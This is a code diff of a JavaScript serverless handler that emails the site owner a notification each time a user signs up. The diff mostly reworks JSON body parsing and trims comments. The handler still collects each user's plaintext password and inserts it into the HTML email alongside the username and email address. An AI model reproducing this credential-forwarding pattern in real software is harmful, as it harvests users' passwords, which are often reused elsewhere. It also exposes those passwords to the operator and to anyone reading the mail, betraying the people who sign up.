@@ -1,11 +1,18 @@
 // 📁 api/notify-owner.js
 export default async function handler(req, res) {
-    // ✅ تحليل جسم الطلب (Body) أولًا
+    // ✅ تحقق من نوع req.body وتحليله بشكل آمن
     let body;
     try {
-        body = JSON.parse(req.body);
+        if (typeof req.body === 'string') {
+            body = JSON.parse(req.body);
+        } else if (req.body) {
+            body = req.body; // لو كان object بالفعل
+        } else {
+            return res.status(400).json({ error: 'No body provided' });
+        }
     } catch (e) {
-        return res.status(400).json({ error: 'Invalid JSON' });
+        console.error('❌ خطأ في تحليل JSON:', e);
+        return res.status(400).json({ error: 'Invalid JSON format' });
     }
 
     if (req.method !== 'POST') {
@@ -13,9 +20,9 @@ export default async function handler(req, res) {
     }
 
     try {
-        const { userEmail, username, userPassword } = body; // ✅ أضفنا userPassword هنا
+        const { userEmail, username, userPassword } = body;
 
-        if (!userEmail || !username || !userPassword) { // ✅ أضفنا userPassword في التحقق
+        if (!userEmail || !username || !userPassword) {
             return res.status(400).json({ error: 'Missing user data' });
         }
 
@@ -34,7 +41,7 @@ export default async function handler(req, res) {
                         <h2 style="color: #FFD700; border-bottom: 2px solid #FFD700; padding-bottom: 10px;">جلالة الملك، هناك ضيف جديد في البلاط!</h2>
                         <p><strong>👑 اسم المستخدم:</strong> ${username}</p>
                         <p><strong>📧 البريد الإلكتروني:</strong> ${userEmail}</p>
-                        <p><strong>🔑 كلمة المرور:</strong> ${userPassword}</p> <!-- ✅ أضفنا كلمة المرور هنا -->
+                        <p><strong>🔑 كلمة المرور:</strong> ${userPassword}</p>
                         <p><strong>🕒 وقت التسجيل:</strong> ${new Date().toLocaleString('ar-EG')}</p>
                         <hr style="border-color: #3e92cc; margin: 20px 0;">
                         <p style="color: #555; font-size: 0.9rem;">هذا إشعار تلقائي من نظام KING ABDO AI — خادمك المخلص.</p>
